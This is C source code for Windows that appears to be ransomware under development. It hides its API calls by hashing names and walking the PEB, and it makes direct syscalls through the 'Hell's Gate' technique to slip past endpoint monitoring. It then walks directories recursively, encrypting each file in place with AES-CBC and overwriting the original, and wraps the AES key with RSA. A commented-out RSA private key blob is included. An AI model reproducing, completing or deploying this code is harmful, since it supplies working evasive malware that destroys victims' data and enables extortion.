#include<windows.h>
#include <strsafe.h>
#include<wincrypt.h>
#include"aes.h"
#include"common.h"
#include <stdio.h>

#pragma comment(lib,"advapi32.lib");

#define AES_256_KEY_SIZE  32 
#define IV_SIZE    16  

extern  VOID HellsGate(WORD wSystemCall);

extern  HellDescent();

//BYTE serverPrivateKey[] ={ 0x07, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x32, 0x00, 0x04, 0x00, 0x00,
//0x01, 0x00, 0x01, 0x00, 0x75, 0x18, 0xC8, 0xE6, 0xF2, 0xB5, 0xC1, 0x39, 0x7E, 0x54, 0x67, 0xFA,
//0x72, 0x6C, 0x64, 0x5F, 0x59, 0xFA, 0x5B, 0x9C, 0x19, 0x2B, 0xDA, 0xAB, 0x99, 0x74, 0x89, 0xD2,
//0x8C, 0x00, 0x04, 0x6C, 0xB1, 0x14, 0xD2, 0xAC, 0x1E, 0x64, 0xBA, 0xF1, 0x94, 0xCF, 0x7E, 0x9D,
//0xFC, 0xE8, 0x4E, 0x16, 0xD5, 0xA4, 0x93, 0x9E, 0xB6, 0xEC, 0xAE, 0xD0, 0x53, 0x2E, 0x8E, 0xEE,
//0x2F, 0x53, 0x16, 0x9F, 0xF2, 0x9E, 0x5A, 0x86, 0x84, 0x8C, 0xCB, 0x83, 0x5F, 0xA0, 0xF3, 0xD7,
//0x14, 0x1B, 0xD3, 0x9E, 0x9C, 0xAE, 0x97, 0x73, 0xE3, 0x04, 0x3A, 0xB7, 0xDD, 0xC0, 0x2C, 0x32,
//0x21, 0x5F, 0x9B, 0x57, 0xB5, 0x4F, 0x7F, 0x8A, 0x8B, 0x57, 0x0A, 0x9D, 0x92, 0x5C, 0x60, 0x48,
//0xF8, 0x18, 0xCC, 0x53, 0x66, 0x47, 0x6F, 0x07, 0xFD, 0x3D, 0x16, 0x3D, 0xFA, 0x1E, 0xC9, 0xE3,
//0x53, 0x29, 0xEE, 0xC1, 0x8B, 0x88, 0x54, 0xEC, 0xB9, 0xAA, 0x21, 0xB5, 0x00, 0x77, 0x70, 0xB0,
//0xA4, 0xAE, 0x1C, 0xE4, 0xFE, 0xAE, 0xD6, 0xDE, 0xE7, 0x35, 0x0A, 0x09, 0xF9, 0x13, 0xD8, 0x1B,
//0x2A, 0x36, 0x33, 0x7E, 0x52, 0x58, 0x68, 0x90, 0xCC, 0xC5, 0x2C, 0x4A, 0x51, 0x2C, 0x9E, 0xD9,
//0xE1, 0x7C, 0xF8, 0x18, 0xCE, 0x07, 0x75, 0x14, 0x26, 0x89, 0x35, 0x16, 0xD1, 0xDE, 0xA5, 0xE0,
//0x9B, 0x8B, 0x48, 0xF4, 0xFF, 0x02, 0xE9, 0x8D, 0xA9, 0x15, 0x5D, 0xD6, 0x4B, 0xB8, 0x2A, 0x8B,
//0xC6, 0x55, 0xC8, 0x97, 0x43, 0xE8, 0x1D, 0xD3, 0xB9, 0x42, 0x70, 0x44, 0x92, 0xC0, 0x88, 0x76,
//0x8A, 0xCD, 0xDB, 0x81, 0x35, 0xEA, 0x30, 0xFA, 0xAD, 0xD4, 0x23, 0xC4, 0x31, 0x4D, 0x52, 0x6B,
//0x7D, 0x53, 0x46, 0xEA, 0x4F, 0x79, 0xF8, 0xFB, 0x09, 0x29, 0x76, 0x8B, 0x3E, 0x60, 0x73, 0xDF,
//0x05, 0x5A, 0x3B, 0xCB, 0xBB, 0x35, 0xE4, 0xE7, 0x63, 0x32, 0x9B, 0xD4, 0x9C, 0x2B, 0x20, 0xC6,
//0x93, 0x13, 0xD5, 0xE1, 0x41, 0x93, 0x91, 0x4C, 0xDD, 0x8F, 0xB9, 0x02, 0x47, 0x65, 0xF3, 0x91,
//0x96, 0xBC, 0xA1, 0xA9, 0x79, 0x7C, 0x46, 0x47, 0x1E, 0x76, 0x02, 0x51, 0x06, 0x07, 0x74, 0xDA,
//0x9B, 0x46, 0x73, 0xBD, 0x95, 0xB4, 0x04, 0x89, 0x94, 0xB9, 0xA4, 0x88, 0x8A, 0x4D, 0x32, 0xB0,
//0x53, 0xCF, 0xA4, 0x01, 0xBD, 0x0E, 0x76, 0xA4, 0x1A, 0xB6, 0xAF, 0x63, 0x15, 0xDA, 0x20, 0x6E,
//0x43, 0x1B, 0x40, 0xD8, 0xDA, 0x2E, 0x48, 0xDE, 0x1B, 0xF0, 0x2E, 0x6C, 0x33, 0xB5, 0x1C, 0xD6,
//0x51, 0x56, 0x74, 0x9C, 0x9C, 0xB7, 0x56, 0x82, 0x6C, 0xC8, 0x7B, 0x3A, 0x0F, 0x4E, 0xE2, 0x28,
//0x00, 0xCE, 0x24, 0x01, 0x7C, 0x1F, 0x1D, 0x6B, 0x81, 0xB7, 0xF0, 0x00, 0xA9, 0x50, 0xB3, 0xFF,
//0x22, 0x5C, 0x0F, 0xBB, 0x6E, 0xD3, 0x50, 0x6B, 0x2D, 0x0A, 0xA7, 0x17, 0xF6, 0x2D, 0xBA, 0x70,
//0xAC, 0x79, 0xE8, 0xE2, 0x7C, 0xD9, 0x26, 0x99, 0x89, 0x24, 0x29, 0xFE, 0xBD, 0x24, 0xA9, 0x20,
//0xF3, 0x3C, 0xD9, 0x7D, 0xFC, 0x59, 0x1B, 0x7F, 0xEE, 0x69, 0xF7, 0x4D, 0x5C, 0xEA, 0xB8, 0xAF,
//0x7B, 0x73, 0xE0, 0x9B, 0xCA, 0x41, 0x4E, 0x24, 0x5C, 0x1C, 0xE6, 0xD8, 0x2A, 0x3E, 0x6F, 0xE5,
//0xBA, 0xB2, 0x31, 0x1A, 0xB1, 0xDD, 0x68, 0x8C, 0x4B, 0xF4, 0x4A, 0xEA, 0xFA, 0xB9, 0x9F, 0xFE,
//0x82, 0x57, 0x87, 0x68, 0xB6, 0xBD, 0x7F, 0x69, 0x64, 0x62, 0xFC, 0xDF, 0xE6, 0xF1, 0x6C, 0xC9,
//0xD7, 0x03, 0x32, 0xA9, 0xDC, 0x6C, 0x51, 0x53, 0x63, 0x64, 0x46, 0x5F, 0x61, 0x9D, 0xBE, 0xD5,
//0x57, 0xFE, 0x2A, 0x48, 0xF1, 0x94, 0xEE, 0x23, 0x38, 0x20, 0xB4, 0x67, 0xAD, 0x17, 0x1D, 0x5E,
//0x5F, 0xE5, 0xF8, 0x89, 0x50, 0x0E, 0xB1, 0x5C, 0xB6, 0xFF, 0xDD, 0x3E, 0x39, 0x07, 0xCE, 0x35,
//0x58, 0xA0, 0xF0, 0x3B, 0x16, 0xDF, 0xCF, 0x5B, 0xDA, 0x98, 0x80, 0x17, 0x48, 0x46, 0x1F, 0x9E,
//0x80, 0x6A, 0x28, 0xB7, 0x37, 0xAD, 0x96, 0x2C, 0xCE, 0x80, 0x64, 0x66, 0x50, 0x81, 0xB0, 0x78,
//0xD5, 0xB5, 0xA5, 0xD5, 0xA4, 0x2C, 0x26, 0xA8, 0xFC, 0x09, 0x0D, 0x75, 0x77, 0xFF, 0x04, 0x86,
//0xB3, 0x52, 0xD0, 0x11 };

VX_TABLE sysCall = { 0 };
HMODULE hKernel32;
HMODULE hAdvapi32;
HMODULE hNtdll;


VOID GetModules(HMODULE* hKernel32, HMODULE* hAdvapi32, HMODULE* hNtdll) {
	 *hNtdll = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"NTDLL.DLL"));
	 *hAdvapi32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"ADVAPI32.DLL"));
	 *hKernel32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"KERNEL32.DLL"));

}

VOID InitializeModules() {

	GetModules(&hKernel32,&hAdvapi32,&hNtdll);
}

WCHAR* to_uppercase(const wchar_t* input) {
	if (input == NULL)
		return NULL;

	
	size_t len = wcslen(input);
	wchar_t* result = (wchar_t*)LocalAlloc(LPTR,(len + 1) * sizeof(wchar_t));
	if (result == NULL)
		return NULL;

	
	for (size_t i = 0; i < len; i++) {
		result[i] = towupper(input[i]);
	}
	result[len] = L'\0';

	return result;
}

HMODULE GetModuleHandleH(UINT32 dllName) {

	PTEB pTeb = (TEB*)(__readgsqword(0x30));
	PPEB pPeb = pTeb->ProcessEnvironmentBlock;
	PPEB_LDR_DATA pLdr = pPeb->LoaderData;
	PLDR_DATA_TABLE_ENTRY pDte = pLdr->InMemoryOrderModuleList.Flink;

	while (pDte) {
	
		if (pDte->FullDllName.Length != 0) {
			
			UINT32 hashedDllName = HashStringJenkinsOneAtATime32BitW(to_uppercase(pDte->FullDllName.Buffer));
			if (hashedDllName == dllName){
				return (HMODULE)pDte->InInitializationOrderLinks.Flink;
			}
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, LPCSTR lpProcName){

	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;

	if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
		return NULL;
	}
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);

	PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pDosHeader + pDataDirectory->VirtualAddress);

	PDWORD pAddressOfFunctions = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfFunctions);
	PDWORD pAddressOfNames = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNames);
	PWORD pAddressOfNameOrdinals = (PWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
		LPCSTR pFunctionName = (LPCSTR)((DWORD_PTR)pDosHeader + pAddressOfNames[i]);
		if (strcmp(pFunctionName, lpProcName) == 0) {
			WORD ordinal = pAddressOfNameOrdinals[i];
			DWORD rva = pAddressOfFunctions[ordinal];
			FARPROC pFunction = (FARPROC)((DWORD_PTR)pDosHeader + rva);
			return pFunction;
		}
	}
	return NULL;
}

BOOL InitializeSysCalls() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	sysCall.NtReadFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtReadFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtReadFile)) {
		return FALSE;
	}

	sysCall.NtWriteFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtWriteFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtWriteFile)) {
		return FALSE;
	}

	sysCall.NtCreateFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtCreateFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtCreateFile)) {
		return FALSE;
	}

	sysCall.NtClose.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtClose");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtClose)) {
		return FALSE;
	}


}

BOOL LoadNativeFunctions(PUNICODE_STRING ufileName,LPCWSTR path, OBJECT_ATTRIBUTES* objAttr) {
	
	if (!hNtdll) return FALSE;

	RtlInitUnicodeStringFunc pRtlInitUnicodeString =
		(RtlInitUnicodeStringFunc)GetProcAddressH(hNtdll, "RtlInitUnicodeString");
	if (!pRtlInitUnicodeString) return FALSE;

	// Use the function
	WCHAR fullPath[MAX_PATH];
	if (wcsncmp(path, L"\\??\\", 4) != 0) {
		wcscpy_s(fullPath, MAX_PATH, L"\\??\\");
		wcscat_s(fullPath, MAX_PATH, path);
	}
	else {
		wcscpy_s(fullPath, MAX_PATH, path);
	}
	pRtlInitUnicodeString(ufileName, fullPath);

	// Create object attributes
	objAttr->Length = sizeof(OBJECT_ATTRIBUTES);
	objAttr->RootDirectory = NULL;
	objAttr->ObjectName = ufileName;
	objAttr->Attributes = OBJ_CASE_INSENSITIVE;
	objAttr->SecurityDescriptor = NULL;
	objAttr->SecurityQualityOfService = NULL;

	return TRUE;
}

BOOL AddPadding(uint8_t* data, SIZE_T* data_len) {
	SIZE_T original_len = *data_len;
	SIZE_T padding_len = 16 - (original_len % 16);

	for (size_t i = original_len; i < original_len + padding_len; i++) {
		data[i] = (uint8_t)padding_len;
	}

	*data_len = original_len + padding_len;

	return TRUE;
}

BOOL GenerateKey(uint8_t* keyValue, uint8_t* iv) {
	
	HCRYPTPROV hProv = NULL;
	HCRYPTKEY hKey = NULL;
	BOOL bSuccess = FALSE;
	BYTE* pbBlob = NULL;

	if (!keyValue || !iv) {
		return bSuccess;
	}

	RtlSecureZeroMemory(keyValue, AES_256_KEY_SIZE);
	RtlSecureZeroMemory(iv,IV_SIZE);

	
	if (hAdvapi32 == NULL) {
		return bSuccess;
	}

	CryptAcquireContextFunc pCryptAcquireContext = (CryptAcquireContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptAcquireContextW"
	);

	if (pCryptAcquireContext == NULL) {
		return bSuccess;
	}

	if (!pCryptAcquireContext(
		&hProv,
		NULL,
		MS_ENH_RSA_AES_PROV_W,
		PROV_RSA_AES,
		CRYPT_VERIFYCONTEXT)){

		goto _EndFunction;
	}

	CryptGenKeyFunc pCryptGenKey = (CryptGenKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenKey"
	);

	if (pCryptAcquireContext == NULL) {
		goto _EndFunction;
	}


	if (!pCryptGenKey(
		hProv,
		CALG_AES_256,
		CRYPT_EXPORTABLE | CRYPT_NO_SALT,
		&hKey)){
		goto _EndFunction;
	}

	DWORD cbBlob = 0;

	CryptExportKeyFunc pCryptExportKey = (CryptExportKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptExportKey");

	if (pCryptExportKey == NULL) {
		return FALSE;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		NULL,
		&cbBlob)){
		goto _EndFunction;
	}

	pbBlob = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBlob);
	if (!pbBlob) {
		goto _EndFunction;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		pbBlob,
		&cbBlob)) {
		goto _EndFunction;
	}
	
	memcpy(keyValue, pbBlob + 12, AES_256_KEY_SIZE);
		
	CryptGenRandomFunc pCryptGenRandom = (CryptGenRandomFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenRandom"
	);

	if (pCryptGenRandom == NULL) {
		return FALSE;
	}

	
	if (!pCryptGenRandom(hProv, IV_SIZE, iv)) {
		goto _EndFunction;
	}

	bSuccess = TRUE;


	printf("key before enc: \n");
	
	for (int i = 0;i < AES_256_KEY_SIZE; i++) {
		printf("%02X ", keyValue[i]);
	}
	
	printf("\n");
		


_EndFunction:
	if (pbBlob) {
		RtlSecureZeroMemory(pbBlob,cbBlob);
		HeapFree(GetProcessHeap(), 0, pbBlob);
	}

	if (!bSuccess) {

		CryptDestroyKeyFunc pCryptDestroyKey = (CryptDestroyKeyFunc)GetProcAddressH(
			hAdvapi32,
			"CryptDestroyKey");
		CryptReleaseContextFunc pCryptReleaseContext = (CryptReleaseContextFunc)GetProcAddressH(
			hAdvapi32,
			"CryptReleaseContext");

		if (hKey) {
			pCryptDestroyKey(hKey);
			hKey = NULL;
		}
		if (hProv) {
			pCryptReleaseContext(hProv, 0);
			hProv = NULL;
		}
		RtlSecureZeroMemory(keyValue,AES_256_KEY_SIZE);
		RtlSecureZeroMemory(iv,IV_SIZE);
	}

	return bSuccess;
}

VOID AESencryptFile(uint8_t key[AES_256_KEY_SIZE], uint8_t iv[IV_SIZE], uint8_t plaintext[IV_SIZE]) {
	struct AES_ctx ctx;

	AES_init_ctx(&ctx, key);
	AES_ctx_set_iv(&ctx, iv);
	AES_CBC_encrypt_buffer(&ctx, plaintext, IV_SIZE);
	

	}

BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {  
	
	
	PBYTE buffer = NULL;
	//DWORD numberOfBytesRead = NULL;
	LARGE_INTEGER fileSize = { 0 };  
	BOOL bSuccess = FALSE;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };

	
	if (!pData || !pfilePath || !szData) {
		return bSuccess;
	}

	GetFileAttributesWFunc pGetFileAttributesW = (GetFileAttributesWFunc)GetProcAddressH(
		hKernel32,
		"GetFileAttributesW"
	);

	if (pGetFileAttributesW(pfilePath) == INVALID_FILE_ATTRIBUTES) {
		return bSuccess;
	}

	LoadNativeFunctions(&filePath,pfilePath,&objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_READ | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);
	
	if(STATUS != 0){
		goto _EndFunction;
	}

	//hFile = CreateFileW(
	//	pfilePath,
	//	GENERIC_READ,
	//	FILE_SHARE_READ,
	//	NULL,
	//	OPEN_EXISTING,
	//	FILE_ATTRIBUTE_NORMAL,
	//	NULL
	//);

	if (hFile == INVALID_HANDLE_VALUE) {
		goto _EndFunction;
	}

	GetFileSizeExFunc pGetFileSizeEx = (GetFileSizeExFunc)GetProcAddressH(
		hKernel32,
		"GetFileSizeEx"
	);

	if (!pGetFileSizeEx(hFile, &fileSize)) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart == 0) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart > SIZE_MAX) {
		goto _EndFunction;
	}

	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)fileSize.QuadPart);
	if (!buffer) {
		goto _EndFunction;
	}
		HellsGate(sysCall.NtReadFile.wSystemCall);	

		STATUS = HellDescent(
		hFile,          
		NULL,          
		NULL,         
		NULL,       
		&ioStatusBlock,
		buffer,       
		(DWORD)fileSize.QuadPart,           
		NULL,         
		NULL);	
		
		if(STATUS != 0 || (DWORD)ioStatusBlock.Information != (DWORD)fileSize.QuadPart){
		goto _EndFunction;
	}


	//if (!ReadFile(hFile, buffer, (DWORD)fileSize.QuadPart, &numberOfBytesRead, NULL) || numberOfBytesRead != (DWORD)fileSize.QuadPart) {
	//	printf("[!] ReadFile failed or incomplete read: %d\n", GetLastError());
	//	goto _EndFunction;
	//}

	*pData = buffer;
	*szData = (SIZE_T)fileSize.QuadPart;
	bSuccess = TRUE;
	buffer = NULL; 

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		HellDescent(hFile);
	}
	if (buffer) {
		HeapFree(GetProcessHeap(), 0, buffer);
	}
	return bSuccess;
}

BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) { 
	BOOL bSuccess = FALSE;  
	HANDLE hFile = NULL;
	DWORD numberOfBytesWritten = 0;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };


	if (!buffer || !pfilePath || numberOfBytesToWrite == 0) {
		return FALSE;
	}


	LoadNativeFunctions(&filePath, pfilePath, &objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_WRITE | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	if (STATUS != 0) {
		goto _EndFunction;
	}

	//hFile = CreateFileW(
	//	pfilePath,
	//	GENERIC_WRITE,
	//	FILE_SHARE_READ,
	//	NULL,
	//	OPEN_ALWAYS,        
	//	FILE_ATTRIBUTE_NORMAL,
	//	NULL
	//);

	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	SetFilePointerFunc pSetFilePointer = (SetFilePointerFunc)GetProcAddressH(
		hKernel32,
		"SetFilePointer"
	);

	SetEndOfFileFunc pSetEndOfFile = (SetEndOfFileFunc)GetProcAddressH(
		hKernel32,
		"SetEndOfFile"
	);

	if (pSetFilePointer(hFile, NULL, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		goto _EndFunction;
	}

	if (!pSetEndOfFile(hFile)) {
		goto _EndFunction;
	}

	
	SIZE_T bytesRemaining = numberOfBytesToWrite;
	SIZE_T currentOffset = 0;
	HellsGate(sysCall.NtWriteFile.wSystemCall);

	while (bytesRemaining > 0) {
		DWORD bytesToWrite = (bytesRemaining > MAXDWORD) ? MAXDWORD : (DWORD)bytesRemaining;

		STATUS = HellDescent(
			hFile,
			NULL,
			NULL,
			NULL,
			&ioStatusBlock,
			buffer,
			(DWORD)bytesRemaining,
			NULL,
			NULL);

		if(STATUS != 0){
			goto _EndFunction;
		}

		//if (!WriteFile(hFile, buffer + currentOffset, bytesToWrite, &numberOfBytesWritten, NULL)) {
		//	printf("[!] Cannot WriteFile %d\n", GetLastError());
		//	goto _EndFunction;
		//}

		if ((DWORD)ioStatusBlock.Information != (DWORD)bytesToWrite) {
			goto _EndFunction;
		}

		bytesRemaining -= (DWORD)ioStatusBlock.Information;
		currentOffset += (DWORD)ioStatusBlock.Information;
	}

	bSuccess = TRUE;

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		STATUS = HellDescent(hFile);
	}
	return bSuccess;
}

BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {

	PBYTE pData = NULL;
	SIZE_T szData = NULL;
	WCHAR* filePath = (WCHAR*)LocalAlloc(LPTR,MAX_PATH * sizeof(WCHAR));

	WCHAR searchPattren[MAX_PATH * sizeof(WCHAR)];
	WIN32_FIND_DATA fileData;
	DWORD dwError = NULL;
	LARGE_INTEGER szFile = { 0 };

	StringCchCopy(searchPattren, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
	StringCchCat(searchPattren, MAX_PATH * sizeof(WCHAR), L"\\*");

	if (hKernel32 == NULL) {
		return 1;
	}

	FindFirstFileWFunc pFindFirstFileW = (FindFirstFileWFunc)GetProcAddressH(hKernel32,"FindFirstFileW");

	FindNextFileWFunc pFindNextFileW = (FindNextFileWFunc)GetProcAddressH(hKernel32,"FindNextFileW");
	
	FindCloseFunc pFindClose = (FindCloseFunc)GetProcAddressH(hKernel32,"FindClose");

	if (pFindClose == NULL) {
		return FALSE;
	}


	if (pFindFirstFileW == NULL || pFindNextFileW == NULL) {
		return FALSE;
	}

	HANDLE hSearch = pFindFirstFileW(searchPattren, &fileData);
	if (hSearch == INVALID_HANDLE_VALUE) {
		return FALSE;
	}



	do {
		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
			continue;
		}
		if (wcscmp(fileData.cFileName, L"docs_1") == 0 || wcscmp(fileData.cFileName, L"docs_2") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0) {
			continue;
		}
		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");  // Fix here
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), fileData.cFileName);


		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {


			if (!DirectoryFiles(filePath,key,iv)) {
				continue;
			}
		}
		else {
			szFile.LowPart = fileData.nFileSizeLow;
			szFile.HighPart = fileData.nFileSizeHigh;

			if (!ReadFromFile(&pData, filePath, &szData)) {
				continue;
			}

			SIZE_T count = { 0 };
			SIZE_T szplaintext = 0;
			uint8_t plaintext[16];
			uint8_t* encryptedData = NULL;
			SIZE_T totalEncryptedSize = 0;
			uint8_t* tempBuffer = NULL;


			while (count< szData) {
				RtlSecureZeroMemory(plaintext,16);
				SIZE_T szplaintext = (count + 16 <= szData) ? 16 : szData - count;
				for (int i = 0; i < 16; i++) {
					if (count < szData) {
						plaintext[i] = pData[count];
						count++;
					}
					else break;
				}

				if(count >= szData && szData % 16 != 0){
					if (!AddPadding(plaintext, &szplaintext)) {
						if (pData) LocalFree(pData);
						if (encryptedData) LocalFree(encryptedData);
						return FALSE;
					}
				}

				tempBuffer = (uint8_t*)realloc(encryptedData, totalEncryptedSize + szplaintext);
				if (!tempBuffer) {
					if (pData) LocalFree(pData);
					if (encryptedData) free(encryptedData);
					return FALSE;
				}
				encryptedData = tempBuffer;

				AESencryptFile(key, iv, plaintext);

				memcpy(encryptedData + totalEncryptedSize, plaintext, szplaintext);
				totalEncryptedSize += szplaintext;

			}

			if (!WriteToFile(encryptedData, filePath, totalEncryptedSize)) {
				if (pData) LocalFree(pData);
				if (encryptedData) LocalFree(encryptedData);
				return FALSE;
			}

		}

	} while (pFindNextFileW(hSearch, &fileData) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		return FALSE;
	}
	pFindClose(hSearch);
	return TRUE;
}

BOOL GenerateKeyPairs(HCRYPTPROV* phCryptProv, HCRYPTKEY* phKey) {

	HCRYPTPROV hCryptProv;
	HCRYPTKEY hKey;



		if (!CryptAcquireContextW(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
			printf("Error %u acquiring cryptographic context\n", GetLastError());
			return FALSE;
		}

		if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, RSA1024BIT_KEY | CRYPT_EXPORTABLE, &hKey)) {
			printf("Error %u generating RSA key pair\n", GetLastError());
			CryptReleaseContext(hCryptProv, 0);
			return FALSE;
		}

		printf("\nRSA key pair generated successfully!\n");

		*phCryptProv = hCryptProv;
		*phKey = hKey;

		return TRUE;
	}

BOOL ExportRSAkeys(HCRYPTPROV hCryptProv, HCRYPTKEY hKey,DWORD flag) {
	DWORD keyLen = 0;
	PBYTE pbKeyBlob = NULL;
	BOOL result = FALSE;

	if (!CryptExportKey(hKey, NULL, flag, 0, NULL, &keyLen)) {
		return FALSE;
	}


	pbKeyBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyLen);
	if (pbKeyBlob == NULL) {
		return FALSE;
	}


	result = CryptExportKey(hKey, NULL, flag, 0, pbKeyBlob, &keyLen);

	printf("\n\n");

	for (int i = 0; i < keyLen; i++) {
		if (i % 16 == 0) printf("\n");
		printf("0x%02X, ", pbKeyBlob[i]);
	}

	printf("\n\n");

	return result;
}

BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,BYTE** cipher) {
	DWORD cipherTextLen = (DWORD)(*keySize);
	DWORD dataLen = 0;
	PBYTE pbBlob = NULL;
	BOOL result = FALSE;


	if (!CryptEncrypt(hKey, NULL, TRUE, 0, NULL, &cipherTextLen, 0)) {
		printf("Error determining buffer size: %d\n", GetLastError());
		return FALSE;
	}

	pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cipherTextLen);
	if (!pbBlob) {
		printf("Memory allocation failed\n");
		return FALSE;
	}

	memcpy(pbBlob, key, *keySize);
	dataLen = (DWORD)*keySize;

	result = CryptEncrypt(hKey, NULL, TRUE, 0, pbBlob, &dataLen, cipherTextLen);
	if (!result) {
		printf("Encryption error: %d\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pbBlob);
		return FALSE;
	}

	printf("\n\n");
	printf("Key after encryption:\n");
	for (DWORD i = 0; i < dataLen; i++) {
		printf("%02X ", pbBlob[i]);
	}
	printf("\n");

	*keySize = dataLen;
	*cipher = pbBlob;
	

	return TRUE;
}

BOOL RSAwork(uint8_t* keyValue) {

	HCRYPTPROV hProv;
	SIZE_T szEncKey = AES_256_KEY_SIZE;
	PBYTE encKey = NULL;
	HCRYPTKEY thKey;


	GenerateKeyPairs(&hProv, &thKey);
	ExportRSAkeys(hProv, thKey, PRIVATEKEYBLOB);
	EncryptAESKey(thKey, (PBYTE)keyValue, &szEncKey, &encKey);
	DecryptAESKey(thKey, encKey, &szEncKey);
	CryptDestroyKey(thKey);



}

BOOL DecryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize){
	
	DWORD cipherTextLen = (DWORD)(*keySize);
	if (!CryptDecrypt(hKey, NULL, TRUE, 0, key, &cipherTextLen)) {
		printf("error %d\n",GetLastError());
		return FALSE;
	}
	printf("\n\n");
	printf("Key after Decryption:\n");
	for (DWORD i = 0; i < cipherTextLen; i++) {
		printf("%02X ", key[i]);
	}
